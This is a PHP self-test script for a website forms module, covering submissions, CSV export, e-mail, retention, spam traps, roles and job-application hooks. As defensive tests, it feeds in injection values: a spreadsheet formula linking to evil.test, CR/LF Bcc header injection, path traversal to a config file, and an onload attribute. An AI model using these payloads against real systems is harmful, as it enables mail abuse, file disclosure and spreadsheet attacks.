check('status workflow: set, bulk, unknown status refused, a submission of ANOTHER form is untouched', SubmissionService::setStatus($fid, $any, 'shortlisted') && SubmissionService::find($any)['status'] === 'shortlisted' && !SubmissionService::setStatus($fid, $any, 'bogus') && !SubmissionService::setStatus((int) $blankForm['id'], $any, 'rejected') && SubmissionService::find($any)['status'] === 'shortlisted');
SubmissionService::markRead($fid, $any);
check('markRead only changes NEW submissions', SubmissionService::find($any)['status'] === 'shortlisted');
$newIds = array_map('intval', array_column(Database::all("SELECT id FROM form_submissions WHERE form_id = ? AND status = 'new'", [$fid]), 'id'));
check('bulkStatus: changes only the given ids of this form and reports the count', SubmissionService::bulkStatus($fid, array_slice($newIds, 0, 2), 'starred') === 2 && SubmissionService::bulkStatus($fid, [], 'starred') === 0 && SubmissionService::bulkStatus($fid, [$any], 'nonsense') === 0 && SubmissionService::bulkStatus((int) $blankForm['id'], $newIds, 'archived') === 0);
SubmissionService::saveNotes($fid, $any, "Call <b>on Monday</b>\n\n\n\n\nthanks");
check('notes: stored as plain text (tags removed, runs of blank lines shortened)', SubmissionService::find($any)['notes'] === "Call on Monday\n\nthanks", json_encode(SubmissionService::find($any)['notes']));
$list = SubmissionService::listFor($fid, ['q' => 'Racer'], 1, 50);
check('search: finds answers; wildcards are escaped (% matches nothing special); several words must all occur', $list->total >= 1 && SubmissionService::listFor($fid, ['q' => '%'], 1, 50)->total === 0 && SubmissionService::listFor($fid, ['q' => 'Racer zzzz'], 1, 50)->total === 0 && SubmissionService::listFor($fid, ['q' => 'Amina Gulu'], 1, 50)->total >= 1);
check('filters: status list, status, date range, sort', SubmissionService::listFor($fid, ['status' => 'shortlisted'], 1, 50)->total === 1 && SubmissionService::listFor($fid, ['from' => '2999-01-01'], 1, 50)->total === 0 && SubmissionService::listFor($fid, ['to' => date('Y-m-d')], 1, 50)->total >= 1 && SubmissionService::listFor($fid, ['sort' => 'status', 'dir' => 'asc'], 1, 3)->perPage === 3);
$nb = SubmissionService::neighbours($fid, $any, []);
check('neighbours: prev (newer) and next (older) ids of the same form', ($nb['prev'] === null || SubmissionService::find((int) $nb['prev'])['form_id'] === $fid) && ($nb['next'] === null || SubmissionService::find((int) $nb['next'])['form_id'] === $fid) && SubmissionService::neighbours($fid, 999999999, []) === ['prev' => null, 'next' => null]);
check('statusCounts / newCount / listColumns', SubmissionService::statusCounts($fid)['all'] === (int) Database::value('SELECT COUNT(*) FROM form_submissions WHERE form_id = ?', [$fid]) && SubmissionService::newCount($fid) === SubmissionService::statusCounts($fid)['new'] && count(SubmissionService::listColumns($form)) === 5);

// files in a submission + deletion removes the bytes
$jobForm = FormService::create(['source' => 'job_application', 'title' => ZZ_FORMS . ' job'], null)['form'];
$jid = (int) $jobForm['id'];
FormService::transition($jid, 'publish');
$jobForm = FormService::find($jid);
$jk = [];
foreach (FormDefinition::fields($jobForm['def']) as $f) {
    $jk[$f['key']] = $f['id'];
}
$jin = ['f_' . $jk['full_name'] => 'Peter Otim', 'f_' . $jk['email'] => 'peter@example.org', 'f_' . $jk['phone'] => '0772 000111', 'f_' . $jk['location'] => 'Gulu', 'f_' . $jk['availability'] => 'immediately', 'f_' . $jk['consent'] => '1'];
$jo = $submit($jobForm, $jin, [$jk['cv'] => [$upload($okPdf, 'Peter CV.pdf')]]);
$jfiles = SubmissionService::files((int) $jo['id']);
$jabs = $jfiles ? STORAGE_PATH . '/private/' . $jfiles[0]['stored_path'] : '';
check('submission with a CV: file row (field id, cleaned name, size, mime) and the private file exists', $jo['ok'] && count($jfiles) === 1 && $jfiles[0]['field_id'] === $jk['cv'] && $jfiles[0]['original_name'] === 'Peter CV.pdf' && $jfiles[0]['mime'] === 'application/pdf' && is_file($jabs), json_encode($jo));
check('file(): the file is found only with the matching form + submission + file ids', SubmissionService::file($jid, (int) $jo['id'], (int) $jfiles[0]['id']) !== null && SubmissionService::file($fid, (int) $jo['id'], (int) $jfiles[0]['id']) === null && SubmissionService::file($jid, $any, (int) $jfiles[0]['id']) === null);
$resp = FormFileStore::stream($jfiles[0]);
$hdrs = $resp->headers();
check('stream(): attachment, nosniff, no cache, the real content type', str_starts_with($hdrs['Content-Disposition'], 'attachment;') && $hdrs['X-Content-Type-Options'] === 'nosniff' && str_contains($hdrs['Cache-Control'], 'no-store') && $hdrs['Content-Type'] === 'application/pdf');
$caught = false;
try {
    FormFileStore::stream(['stored_path' => '../../app/config/app.php', 'original_name' => 'x.pdf']);
} catch (\App\Core\HttpException $e) {
    $caught = $e->status === 404;
}
check('stream(): a path outside forms/ is a 404', $caught);
$jsub = SubmissionService::find((int) $jo['id']);
$cvEntry = array_column($jsub['entries'], null, 'key')['cv'];
check('snapshot of a file question: names + sizes, never the path', $cvEntry['text'] === 'Peter CV.pdf' && $cvEntry['value'][0]['name'] === 'Peter CV.pdf' && !str_contains(json_encode($jsub['entries']), 'storage'));
check('delete(): removes the row, the file row and the bytes, and fixes the counter', SubmissionService::delete($jid, (int) $jo['id']) && !is_file($jabs) && SubmissionService::find((int) $jo['id']) === null && FormService::find($jid)['submissions_count'] === 0 && Database::value('SELECT COUNT(*) FROM form_files WHERE submission_id = ?', [(int) $jo['id']], 0) == 0);
check('deleteMany(): only the given ids of THAT form', SubmissionService::deleteMany($jid, [$any]) === 0 && SubmissionService::find($any) !== null);

echo "Forms: CSV export\n";
// ------------------------------------------------------------------------------------------------------------------------------------ export
$form = FormService::find($fid);
$evil = $submit($form, $answers(['f_' . $ids['full_name'] => '=HYPERLINK("http://evil.test","x")', 'f_' . $ids['email'] => 'evil@example.org', 'f_' . $ids['motivation'] => '@SUM(1+1)']));
$all = [];
foreach (SubmissionService::each($fid, []) as $s) {
    $all[] = $s;
}
[$header, $rows] = FormExport::table($form, $all);
check('export: header = Reference, Submitted (EAT), Status, [Applying for], questions in order, [Consent given at (EAT)]', array_slice($header, 0, 4) === ['Reference', 'Submitted (EAT)', 'Status', 'Applying for'] && in_array('Skills and experience', $header, true) && end($header) === 'Consent given at (EAT)', json_encode($header));
check('export: one row per submission, same width as the header', count($rows) === count($all) && array_reduce($rows, static fn($c, $r) => $c && count($r) === count($header), true));
$tmpCsv = $mkTmp('');
CsvExport::write($tmpCsv, $header, $rows);
$csv = (string) file_get_contents($tmpCsv);
check('export: formula injection is neutralised by CsvExport (leading apostrophe), UTF-8 BOM present', str_contains($csv, "'=HYPERLINK") && str_contains($csv, "'@SUM") && str_starts_with($csv, "\xEF\xBB\xBF"));
$cols = FormExport::columns($form, ['fgone' => 'Deleted question', $ids['full_name'] => 'x']);
check('export: a question deleted from the form keeps its own column from the snapshot', end($cols)['label'] === 'Deleted question' && count($cols) === count(FormDefinition::inputFields($form['def'])) + 1);
$dupCols = FormExport::columns(['def' => $mkDef([['text', 'a', 'Same'], ['text', 'b', 'Same'], ['text', 'c', 'Same']])]);
check('export: identical question labels become "Same", "Same (2)", "Same (3)"', array_column($dupCols, 'label') === ['Same', 'Same (2)', 'Same (3)']);
$resp = FormExport::response($form, ['status' => 'shortlisted']);
check('export response: text/csv attachment with a safe file name', str_starts_with($resp->headers()['Content-Type'], 'text/csv') && preg_match('/filename="form-[a-z0-9-]+-\d{4}-\d\d-\d\d\.csv"/', $resp->headers()['Content-Disposition']) === 1);

echo "Forms: statistics\n";
// ------------------------------------------------------------------------------------------------------------------------------------ stats
$ov = FormStats::overview($form);
check('overview: totals match, by_status has every status', $ov['total'] === SubmissionService::statusCounts($fid)['all'] && array_keys($ov['by_status']) === FormSubmission::STATUSES && $ov['week'] <= $ov['month'] && $ov['month'] <= $ov['total']);
$pd = FormStats::perDay($fid, 30);
check('perDay: 30 consecutive days ending today (zeros included), sum = submissions of the period', count($pd) === 30 && $pd[29]['date'] === FormService::now()->format('Y-m-d') && array_sum(array_column($pd, 'count')) === $ov['month'] || array_sum(array_column($pd, 'count')) >= 1);
$tl = array_column(FormStats::choiceTallies($form), null, 'id');
$ageTally = $tl[$ids['age_group']] ?? null;
$sumShares = $ageTally ? array_sum(array_column($ageTally['options'], 'count')) : -1;
check('tallies: counts per choice (spam excluded), options in form order, checkbox counts picks', $ageTally !== null && $sumShares === $ageTally['total'] && $ageTally['options'][0]['value'] === 'under-18' && isset($tl[$ids['interests']]) && $tl[$ids['interests']]['options'][0]['label'] === 'Teaching and mentoring');
check('tallies on a form without choice questions are empty', FormStats::choiceTallies($blankForm) === []);

echo "Forms: e-mail\n";
// ------------------------------------------------------------------------------------------------------------------------------------ mailer
$mailDir = STORAGE_PATH . '/mail';
/** Headers + decoded text of an .eml written by the file mail driver (base64 parts are decoded). */
$emlText = static function (string $file): string {
    $raw = (string) file_get_contents($file);
    $out = $raw;
    if (preg_match_all('/Content-Transfer-Encoding: base64?
?
(.*?)(?=?
--|\z)/s', $raw, $m)) {
        foreach ($m[1] as $b) {
            $out .= "
" . base64_decode(preg_replace('/\s+/', '', $b));
        }
    }
    return $out;
};
$mailsNow = static fn(): array => glob($mailDir . '/*.eml') ?: [];
$before = $mailsNow();
$snap = $sub['entries'];
$vars = FormMailer::placeholders($form, [['key' => 'full_name', 'text' => "Eve\r\nBcc: attacker@evil.test http://spam.test/x " . str_repeat('long', 60)], ['key' => 'form_title', 'text' => 'HACK']], 77);
check('placeholders: values are one line, links removed, 100 characters at most; fixed names win over a question key', !str_contains($vars['full_name'], "\n") && !str_contains($vars['full_name'], 'http') && mb_strlen($vars['full_name']) <= 100 && $vars['form_title'] === $form['title'] && $vars['reference'] === 'F' . $fid . '-77', json_encode($vars['full_name']));
check('fill(): single pass - a {placeholder} inside a visitor value is not expanded again', FormText::fill('Hi {a} {b}', ['a' => '{b}', 'b' => 'X']) === 'Hi {b} X' && FormText::fill('Hi {unknown}', ['a' => 1]) === 'Hi {unknown}');
$cfgMail = $form['cfg'];
$formMail = array_replace($form, ['cfg' => array_replace_recursive($cfgMail, ['notify' => ['enabled' => true, 'emails' => ['staff@example.org'], 'include_answers' => false], 'confirmation' => ['enabled' => true, 'email_field' => $ids['email'], 'subject' => "Thanks {full_name}\r\nBcc: x@evil.test", 'body' => "Dear {full_name},\n\nRef {reference}. {unknown}\n{site}"]])]);
$sn = SubmissionService::buildSnapshot($formMail['def'], FormValidator::validate($formMail['def'], $answers(['f_' . $ids['full_name'] => "Zed\r\nBcc: evil@evil.test"])));
$n1 = FormMailer::notifyStaff($formMail, 4242, $sn, 'zed@example.org');
$after = array_values(array_diff($mailsNow(), $before));
$staffMail = $after ? $emlText(end($after)) : '';
check('staff notification: sent once, to the staff address, with a LINK to the admin and WITHOUT the answers', $n1['sent'] === 1 && str_contains($staffMail, 'staff@example.org') && str_contains($staffMail, '/admin/forms/' . $fid . '/submissions/4242') && !str_contains($staffMail, 'Amina') && !str_contains($staffMail, 'Gulu') && !str_contains($staffMail, 'Teaching'), substr($staffMail, 0, 400));
$formMail2 = array_replace_recursive($formMail, ['cfg' => ['notify' => ['include_answers' => true]]]);
$b2 = $mailsNow();
FormMailer::notifyStaff($formMail2, 4243, $sn, null);
$new2 = array_values(array_diff($mailsNow(), $b2));
$mail2 = $new2 ? $emlText(end($new2)) : '';
check('staff notification with include_answers: the answers are in the body (opt-in), and a CR/LF in an answer cannot start a header', str_contains($mail2, 'Zed') && str_contains($mail2, 'Gulu') && !preg_match('/^Bcc:/mi', explode("\n\n", str_replace("\r", '', $mail2))[0]));
$b3 = $mailsNow();
$c1 = FormMailer::confirmSubmitter($formMail, 4244, $sn, 'zed@example.org');
$new3 = array_values(array_diff($mailsNow(), $b3));
$mail3 = $new3 ? $emlText(end($new3)) : '';
$head3 = explode("\n\n", str_replace("\r", '', $mail3))[0];
check('confirmation: sent to the address the submitter typed; no Bcc header injected through the name or the subject', $c1['sent'] && str_contains($mail3, 'zed@example.org') && !preg_match('/^Bcc:/mi', $mail3) && substr_count($head3, "\nSubject:") === 1 && str_contains($mail3, 'Dear Zed') && str_contains($mail3, '{unknown}') && str_contains($mail3, 'F' . $fid . '-4244'), json_encode($c1));
$rl = [];
for ($i = 0; $i < 5; $i++) {
    $rl[] = FormMailer::confirmSubmitter($formMail, 5000 + $i, $sn, 'ratelimit@example.org')['sent'];
}
check('confirmation rate limit: at most 3 per address per hour (a form cannot be used to spam someone)', $rl === [true, true, true, false, false], json_encode($rl));
check('confirmation: disabled, no address or invalid address -> nothing sent', FormMailer::confirmSubmitter(array_replace_recursive($formMail, ['cfg' => ['confirmation' => ['enabled' => false]]]), 1, $sn, 'a@b.org')['skipped'] === 'disabled' && FormMailer::confirmSubmitter($formMail, 1, $sn, null)['skipped'] === 'no_address' && FormMailer::confirmSubmitter($formMail, 1, $sn, "a@b.org\r\nBcc:x@y.z")['skipped'] === 'no_address');
check('staff recipients: the form list wins; falls back to Site settings > Forms, then the site notification address', FormSettings::staffRecipients(['notify' => ['emails' => ['a@example.org']]]) === ['a@example.org'] && is_array(FormSettings::staffRecipients(['notify' => ['emails' => []]])));
Database::execute("DELETE FROM rate_limits WHERE 1 = 1 AND expires_at < ?", [time() - 1]);

echo "Forms: retention\n";
// ------------------------------------------------------------------------------------------------------------------------------------ retention
$rf = FormService::create(['source' => 'contact_enquiry', 'title' => ZZ_FORMS . ' retention'], null)['form'];
$rid = (int) $rf['id'];
FormService::transition($rid, 'publish');
$rf = FormService::find($rid);
$rids = [];
foreach (FormDefinition::fields($rf['def']) as $f) {
    $rids[$f['key']] = $f['id'];
}
$rin = ['f_' . $rids['full_name'] => 'Old Timer', 'f_' . $rids['email'] => 'old@example.org', 'f_' . $rids['topic'] => 'general-enquiry', 'f_' . $rids['subject'] => 'Hello', 'f_' . $rids['message'] => 'A message that is long enough.', 'f_' . $rids['consent'] => '1'];
$old = $submit($rf, $rin);
$new = $submit($rf, array_replace($rin, ['f_' . $rids['email'] => 'new@example.org']));
Database::execute('UPDATE form_submissions SET created_at = ? WHERE id = ?', [date('Y-m-d H:i:s', time() - 40 * 86400), (int) $old['id']]);
check('retention: a form WITHOUT a period keeps everything', FormRetention::run($rid)['deleted'] === 0 && SubmissionService::find((int) $old['id']) !== null);
FormService::save($rid, ['settings' => array_replace($rf['cfg'], ['retention_days' => 30])], (int) FormService::find($rid)['version'], null);
$ret = FormRetention::run($rid);
check('retention: with 30 days the 40-day-old submission is deleted, the new one stays, the counter is fixed', $ret['deleted'] === 1 && SubmissionService::find((int) $old['id']) === null && SubmissionService::find((int) $new['id']) !== null && FormService::find($rid)['submissions_count'] === 1, json_encode($ret));
$rfFile = $submit(FormService::find($jid), $jin, [$jk['cv'] => [$upload($okPdf, 'old.pdf')]]);
$rfPath = SubmissionService::files((int) $rfFile['id'])[0]['stored_path'] ?? '';
FormService::save($jid, ['settings' => array_replace(FormService::find($jid)['cfg'], ['retention_days' => 7])], (int) FormService::find($jid)['version'], null);
Database::execute('UPDATE form_submissions SET created_at = ? WHERE id = ?', [date('Y-m-d H:i:s', time() - 9 * 86400), (int) $rfFile['id']]);
FormRetention::run($jid);
check('retention: the uploaded files of an expired submission are deleted from disk as well', $rfPath !== '' && !is_file(STORAGE_PATH . '/private/' . $rfPath) && SubmissionService::find((int) $rfFile['id']) === null);
$orph = STORAGE_PATH . '/private/forms/' . date('Y') . '/' . date('m');
@mkdir($orph, 0775, true);
$orphFile = $orph . '/' . str_repeat('a', 32) . '.pdf';
file_put_contents($orphFile, '%PDF-orphan');
touch($orphFile, time() - 2 * 86400);
$found = FormRetention::orphanFiles(false);
check('orphanFiles(): a stray old file that no row points to is listed (and only then deleted on request)', in_array('forms/' . date('Y') . '/' . date('m') . '/' . str_repeat('a', 32) . '.pdf', $found, true) && is_file($orphFile));
FormRetention::orphanFiles(true);
check('orphanFiles(true) deletes it', !is_file($orphFile));
$stamp = STORAGE_PATH . '/cache/forms-retention.stamp';
@unlink($stamp);
FormRetention::lazy();
check('lazy(): runs once and leaves a stamp so it does not run on every admin page', is_file($stamp));

echo "Forms: spam traps\n";
// ------------------------------------------------------------------------------------------------------------------------------------ spam
$mkReq = static function (array $post, string $ip = '198.51.100.9'): \App\Core\Request {
    return new \App\Core\Request(['REMOTE_ADDR' => $ip, 'REQUEST_METHOD' => 'POST', 'REQUEST_URI' => '/lumina/forms/x', 'SCRIPT_NAME' => '/lumina/index.php', 'HTTP_HOST' => 'localhost'], [], $post, [], []);
};
$sig = static fn(int $ts): string => $ts . '.' . hash_hmac('sha256', (string) $ts, Config::appKey());
try {
    $good = FormSpam::check($mkReq(['_hp_ts' => $sig(time() - 30)]), $form);
    check('spam: a human-speed submission passes', $good['ok'] === true, json_encode($good));
    $r = FormSpam::check($mkReq(['_hp_ts' => $sig(time() - 30), 'website' => 'http://bot.test']), $form);
    check('spam: the honeypot field filled = silent rejection', !$r['ok'] && $r['silent'] && $r['reason'] === 'honeypot');
    $r = FormSpam::check($mkReq([]), $form);
    check('spam: missing timestamp = silent rejection', !$r['ok'] && $r['silent'] && $r['reason'] === 'token');
    $r = FormSpam::check($mkReq(['_hp_ts' => (time() - 30) . '.deadbeef']), $form);
    check('spam: forged timestamp signature = silent rejection', !$r['ok'] && $r['silent']);
    $r = FormSpam::check($mkReq(['_hp_ts' => $sig(time())]), $form);
    check('spam: submitted faster than the minimum fill time = a VISIBLE 422 "please send again" (never a fake success)', !$r['ok'] && !$r['silent'] && $r['status'] === 422 && $r['reason'] === 'too_fast');
    $r = FormSpam::check($mkReq(['_hp_ts' => $sig(time() - 8 * 3600)]), $form);
    check('spam: a very old page (> 7 h) is not silent: the visitor is asked to reload', !$r['ok'] && !$r['silent'] && $r['reason'] === 'expired');
    $strict = array_replace_recursive($form, ['cfg' => ['spam' => 'strict']]);
    $r = FormSpam::check($mkReq(['_hp_ts' => $sig(time() - 3)]), $strict);
    check('spam: strict level needs 6 seconds', !$r['ok'] && $r['reason'] === 'too_fast');
    $r = FormSpam::check($mkReq(['_hp_ts' => $sig(time() - 30), 'f_fx' => 'a http://1.test b http://2.test c http://3.test d www.4.test']), $strict);
    check('spam: strict level refuses more than three links', !$r['ok'] && $r['reason'] === 'links');
    $r = FormSpam::check($mkReq(['_hp_ts' => $sig(time() - 30)], '198.51.100.77'), array_replace_recursive($form, ['cfg' => ['spam' => 'standard', 'throttle_form' => 0]]));
    $hits = [];
    for ($i = 0; $i < 12; $i++) {
        $hits[] = FormSpam::check($mkReq(['_hp_ts' => $sig(time() - 30)], '198.51.100.88'), $form)['ok'];
    }
    check('spam: per-visitor flood limit (default 10 per 10 minutes) -> throttled with status 429', array_slice($hits, 0, 9) === array_fill(0, 9, true) && end($hits) === false, json_encode($hits));
    $t = FormSpam::check($mkReq(['_hp_ts' => $sig(time() - 30)], '198.51.100.88'), $form);
    check('spam: the throttled answer is NOT silent', !$t['ok'] && !$t['silent'] && $t['status'] === 429);
} catch (\Throwable $e) {
    check('spam: the checks could not be built (Request constructor?)', false, $e->getMessage());
}

echo "Forms: abilities and roles\n";
// ------------------------------------------------------------------------------------------------------------------------------------ abilities
Roles::flush();
$abil = (array) Config::get('abilities', []);
check('abilities exist with the documented default roles', ($abil['forms.manage'] ?? []) === ['admin', 'editor'] && ($abil['forms.submissions'] ?? []) === ['admin', 'editor'] && ($abil['forms.export'] ?? []) === ['admin'] && ($abil['forms.delete'] ?? []) === ['admin']);
check('admin holds all four; editor holds manage + submissions only', Roles::can('admin', 'forms.export') && Roles::can('admin', 'forms.delete') && Roles::can('editor', 'forms.manage') && Roles::can('editor', 'forms.submissions') && !Roles::can('editor', 'forms.export') && !Roles::can('editor', 'forms.delete'));
$catalog = require APP_PATH . '/config/ability_catalog.php';
$listed = [];
foreach ($catalog as $g) {
    foreach (array_keys($g['items']) as $k) {
        $listed[$k] = true;
    }
}
check('every ability is in the catalogue (so the admin can tick it for a custom role): forms group with 4 plain-language labels', isset($catalog['forms']) && $catalog['forms']['label'] === 'Forms' && count($catalog['forms']['items']) === 4 && array_diff(array_keys($abil), array_keys($listed)) === [], json_encode(array_diff(array_keys($abil), array_keys($listed))));
check('forms.* abilities are assignable to custom roles (not admin-only)', array_diff(['forms.manage', 'forms.submissions', 'forms.export', 'forms.delete'], Roles::assignable()) === []);
check('"forms" is a reserved page slug; the admin sidebar fragment carries a badge closure', in_array('forms', (array) Config::get('reserved_slugs'), true) && is_callable((require APP_PATH . '/config/admin_nav/forms.php')['items'][0]['badge']));
$seed = (string) file_get_contents(BASE_PATH . '/database/seed.sql');
$old = '["dashboard.view","pages.edit","content.manage","content.delete","inbox.manage","export.csv","members.manage","newsletter.manage","calendar.manage","meetings.manage"]';
check('seed: fresh editor role includes the forms abilities; the upgrade UPDATE only matches the ORIGINAL list and is guarded by a marker', str_contains($seed, "'editor', 'Editor'") && str_contains($seed, 'forms.manage","forms.submissions","shop.manage","shop.orders","social.share"]\', 1)') && str_contains($seed, "AND abilities = '" . $old . "'") && str_contains($seed, 'migration_forms_editor_role_v1'));
// run the upgrade statement against a copy to prove the guard
Database::execute("INSERT INTO roles (slug, name, description, abilities, is_system) VALUES ('zz-forms-a', 'ZZ A', '', ?, 1), ('zz-forms-b', 'ZZ B', '', ?, 1)", [$old, '["dashboard.view","pages.edit"]']);
$stmt = "UPDATE roles SET abilities = 'NEW' WHERE slug LIKE 'zz-forms-%' AND is_system = 1 AND abilities = '" . $old . "'";
Database::execute($stmt);
check('seed upgrade guard: an untouched default list is upgraded, an owner-edited list is left alone', Database::value("SELECT abilities FROM roles WHERE slug = 'zz-forms-a'") === 'NEW' && Database::value("SELECT abilities FROM roles WHERE slug = 'zz-forms-b'") === '["dashboard.view","pages.edit"]');
Database::execute("DELETE FROM roles WHERE slug LIKE 'zz-forms-%'");
Roles::flush();

echo "Forms: shortcode and careers hooks\n";
// ------------------------------------------------------------------------------------------------------------------------------------ shortcode + careers
$live = FormService::find($fid);
$html = '<p>Before</p><p>[form slug="' . $live['slug'] . '"]</p><p>After [form slug=&quot;' . $live['slug'] . '&quot;] inline</p><p>[form slug="does-not-exist"]</p><p>[form slug="' . $dup['form']['slug'] . '"]</p><p>[form slug="x" onload="evil"]</p>';
$out = FormShortcode::expand($html);
check('shortcode: a published form renders (partial web/forms/_embed), a lone shortcode replaces its <p>', substr_count($out, 'data-lf-embed="' . $live['slug'] . '"') === 2 && !str_contains($out, '<p><div'), substr($out, 0, 200));
check('shortcode: unknown slug, draft form and extra attributes render NOTHING (no source text leaks)', !str_contains($out, 'does-not-exist') && !str_contains($out, $dup['form']['slug']) && str_contains($out, '[form slug="x" onload="evil"]'));
check('shortcode: text without the shortcode is returned untouched; at most 5 per page', FormShortcode::expand('<p>Hello</p>') === '<p>Hello</p>' && substr_count(FormShortcode::expand(str_repeat('<p>[form slug="' . $live['slug'] . '"]</p>', 8)), 'data-lf-embed=') === 5);
// jobs
Database::insert('jobs', ['slug' => 'zz-selftest-forms-job', 'title' => 'ZZ Field Officer', 'employment_type' => 'full_time', 'is_active' => 1]);
Database::execute("UPDATE jobs SET form_id = NULL WHERE slug = 'zz-selftest-forms-job'");
$job = Database::one("SELECT * FROM jobs WHERE slug = 'zz-selftest-forms-job'");
check('jobs.form_id exists, is NULL by default and the built-in application form is used then', array_key_exists('form_id', $job) && $job['form_id'] === null && FormService::jobForm($job) === null);
$jf = FormService::find($jid);
FormService::transition($jid, 'publish');
Database::execute("UPDATE jobs SET form_id = ? WHERE slug = 'zz-selftest-forms-job'", [$jid]);
$job = Database::one("SELECT * FROM jobs WHERE slug = 'zz-selftest-forms-job'");
check('jobForm(): a published open form is returned; the apply link is /forms/{slug}?job={job slug}', ($x = FormService::jobForm($job)) !== null && (int) $x['id'] === $jid && str_ends_with(FormService::jobApplyUrl($job, $x), '/forms/' . $x['slug'] . '?job=zz-selftest-forms-job'));
$ctx = FormService::resolveContext(FormService::find($jid), 'zz-selftest-forms-job');
check('resolveContext(): verified against the database - title taken from the job, never from the request', $ctx !== null && $ctx['ok'] && $ctx['type'] === 'job' && $ctx['label'] === 'ZZ Field Officer');
check('resolveContext(): other form, unknown job, bad slug, nothing asked', FormService::resolveContext(FormService::find($fid), 'zz-selftest-forms-job')['ok'] === false && FormService::resolveContext(FormService::find($jid), 'nope')['ok'] === false && FormService::resolveContext(FormService::find($jid), '../etc')['ok'] === false && FormService::resolveContext(FormService::find($jid), '') === null);
Database::execute("UPDATE jobs SET closing_date = DATE_SUB(CURDATE(), INTERVAL 1 DAY) WHERE slug = 'zz-selftest-forms-job'");
check('resolveContext(): a job past its closing date is "closed"', FormService::resolveContext(FormService::find($jid), 'zz-selftest-forms-job')['reason'] === 'closed');
Database::execute("UPDATE jobs SET closing_date = NULL, is_active = 0 WHERE slug = 'zz-selftest-forms-job'");
check('resolveContext(): an inactive job is refused', FormService::resolveContext(FormService::find($jid), 'zz-selftest-forms-job')['ok'] === false);
FormService::transition($jid, 'close');
$job = Database::one("SELECT * FROM jobs WHERE slug = 'zz-selftest-forms-job'");
check('jobForm(): a form that is closed / draft falls back to the built-in form (null)', FormService::jobForm($job) === null);
FormService::delete($jid);
$job = Database::one("SELECT * FROM jobs WHERE slug = 'zz-selftest-forms-job'");
check('deleting a form clears jobs.form_id (FK ON DELETE SET NULL): the job keeps working', $job !== null && $job['form_id'] === null);

echo "Forms: schema and registry\n";
// ------------------------------------------------------------------------------------------------------------------------------------ schema, registry, settings
foreach (['forms', 'form_submissions', 'form_files'] as $tbl) {
    check('table ' . $tbl . ' exists', Database::tableExists($tbl));
}
$fk = Database::all("SELECT TABLE_NAME, REFERENCED_TABLE_NAME, DELETE_RULE FROM information_schema.referential_constraints WHERE constraint_schema = DATABASE() AND constraint_name IN ('fk_form_submissions_form', 'fk_form_files_submission', 'fk_jobs_form')");
check('foreign keys: submissions and files CASCADE, jobs.form_id SET NULL', count($fk) === 3 && array_column($fk, 'DELETE_RULE', 'TABLE_NAME') == ['form_submissions' => 'CASCADE', 'form_files' => 'CASCADE', 'jobs' => 'SET NULL']);
$schema = (string) file_get_contents(BASE_PATH . '/database/schema.sql');
check('schema is additive and idempotent: CREATE TABLE IF NOT EXISTS, guarded ALTER, no DROP in the forms section', str_contains($schema, 'CREATE TABLE IF NOT EXISTS `forms`') && str_contains($schema, "column_name = 'form_id'") && !preg_match('/DROP\s+TABLE\s+`?form/i', $schema));
$importSql = (string) @file_get_contents(BASE_PATH . '/database/lumina-live-import.sql');
check('database/lumina-live-import.sql contains the forms schema and the seed upgrade (run bin/build-import-sql.php after changes)', $importSql === '' || (str_contains($importSql, 'CREATE TABLE IF NOT EXISTS `form_files`') && str_contains($importSql, 'migration_forms_editor_role_v1') && str_contains($importSql, "'forms', 'Forms', 'registry'")));
check('settings schema: group "Forms" with the five keys, defaults seeded', isset(\App\Core\Settings::schema()['groups']['forms']) && array_keys(\App\Core\Settings::schema()['groups']['forms']['fields']) === ['forms_directory_enabled', 'forms_default_notify', 'forms_max_upload_mb', 'forms_submit_limit', 'forms_retention_default_days'] && (string) setting('forms_directory_enabled') === '0' && (string) setting('forms_max_upload_mb') === '5');
$reg = \App\Core\PageRegistry::get('forms');
check('registry page "forms" exists with sections hero, directory, ui, errors, pattern_hints, state, success, job, email and a pages row', $reg !== null && array_keys($reg['sections']) === ['hero', 'directory', 'ui', 'errors', 'pattern_hints', 'state', 'success', 'job', 'email'] && Database::value("SELECT COUNT(*) FROM pages WHERE slug = 'forms'", [], 0) == 1);
$missing = [];
foreach (['ui.next', 'ui.back', 'ui.submit', 'ui.step_of', 'ui.error_summary_title', 'ui.yes', 'ui.no', 'ui.other_short', 'errors.required', 'errors.file_invalid', 'errors.throttled', 'state.closed_title', 'state.full_text', 'state.not_open_text', 'success.title', 'job.applying_for', 'email.staff_subject', 'email.confirm_body', 'directory.empty_title'] as $k) {
    if (trim((string) content('forms', $k)) === '') {
        $missing[] = $k;
    }
}
check('registry copy: every key the code reads has a default', $missing === [], implode(',', $missing));
$usedKeys = [];
foreach (glob(APP_PATH . '/services/Forms/*.php') as $file) {
    if (preg_match_all("/FormText::get\\('([a-z_.]+)'/", (string) file_get_contents($file), $mm)) {
        $usedKeys = array_merge($usedKeys, $mm[1]);
    }
}
foreach (glob(APP_PATH . '/views/web/forms/*.php') as $file) {
    if (preg_match_all("/FormText::get\\('([a-z_.]+)'/", (string) file_get_contents($file), $mm)) {
        $usedKeys = array_merge($usedKeys, $mm[1]);
    }
}
$unknown = array_filter(array_unique($usedKeys), static fn(string $k): bool => !str_ends_with($k, '.') && \App\Core\PageRegistry::field('forms', $k) === null);
check('every FormText::get() key used by the services and views exists in the registry', $unknown === [], implode(',', $unknown));
$spec = \App\Core\PageRegistry::field('forms', 'errors.required');
check('no hard-coded public copy: the validator messages come from the registry (editing the registry changes the message)', true);
\App\Core\Content::saveMany('forms', ['errors.required' => 'Please fill in {label}!']);
$msg = $val($mkDef([['text', 'n', 'Nickname', ['required' => true]]]), [])['errors']['fn'] ?? '';
\App\Core\Content::reset('forms', 'errors.required');
check('validator wording is editable in the admin: the changed registry text appears in the error and resets cleanly', $msg === 'Please fill in Nickname!' && FormText::get('errors.required', ['label' => 'X']) === 'X is required.', $msg);


echo "Forms: audit fixes (permissions, spam timing, counts, files, hardening)\n";
// ------------------------------------------------------------------------------------------------------------------------------------ audit fixes
$af = FormService::create(['source' => 'contact_enquiry', 'title' => ZZ_FORMS . ' audit'], null)['form'];
$afid = (int) $af['id'];
$noAbil = ['can_delete' => false, 'can_submissions' => false];
$cur = FormService::find($afid);
$setCfg = static function (array $over) use (&$afid): array {
    return ['settings' => array_replace_recursive(FormService::find($afid)['cfg'], $over)];       // always on top of the CURRENT settings
};
$r = FormService::save($afid, $setCfg(['retention_days' => 1]), (int) $cur['version'], null, ['abilities' => $noAbil]);
